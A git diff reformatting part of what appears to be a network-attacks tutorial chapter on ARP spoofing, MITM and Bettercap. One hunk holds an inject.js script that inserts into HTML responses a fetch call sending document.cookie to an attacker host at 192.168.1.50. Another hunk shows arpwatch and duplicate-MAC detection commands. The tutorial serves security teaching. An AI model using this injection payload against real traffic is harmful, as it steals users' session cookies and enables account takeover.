@@ -1,10 +1,11 @@
 ---
-title: "Network Attacks"
-subtitle: "ARP spoofing, MITM, packet capture, credential sniffing, DNS poisoning — attacking the network layer."
+title: 'Network Attacks'
+subtitle: 'ARP spoofing, MITM, packet capture, credential sniffing, DNS poisoning — attacking the network layer.'
 chapter: 8
-level: "intermediate"
-readingTime: "12 min"
-topics: ["ARP spoofing", "MITM", "Wireshark", "tcpdump", "Bettercap", "DNS poisoning", "network attacks"]
+level: 'intermediate'
+readingTime: '12 min'
+topics:
+  ['ARP spoofing', 'MITM', 'Wireshark', 'tcpdump', 'Bettercap', 'DNS poisoning', 'network attacks']
 ---
 
 <script>
@@ -99,12 +100,12 @@ http.proxy on
 ```javascript
 // inject.js — example script to inject into HTTP responses
 function onResponse(req, res) {
-  if (res.ContentType.includes('text/html')) {
-    res.Body = res.Body.replace(
-      '</body>',
-      '<script>fetch("http://192.168.1.50/steal?c="+document.cookie)</script></body>'
-    );
-  }
+	if (res.ContentType.includes('text/html')) {
+		res.Body = res.Body.replace(
+			'</body>',
+			'<script>fetch("http://192.168.1.50/steal?c="+document.cookie)</script></body>'
+		);
+	}
 }
 ```
 
@@ -263,4 +264,3 @@ arp -a | sort -k4 | uniq -d -f3   # duplicate MAC addresses = ARP spoofing
 sudo apt install arpwatch
 sudo arpwatch -i eth0
 ```
-
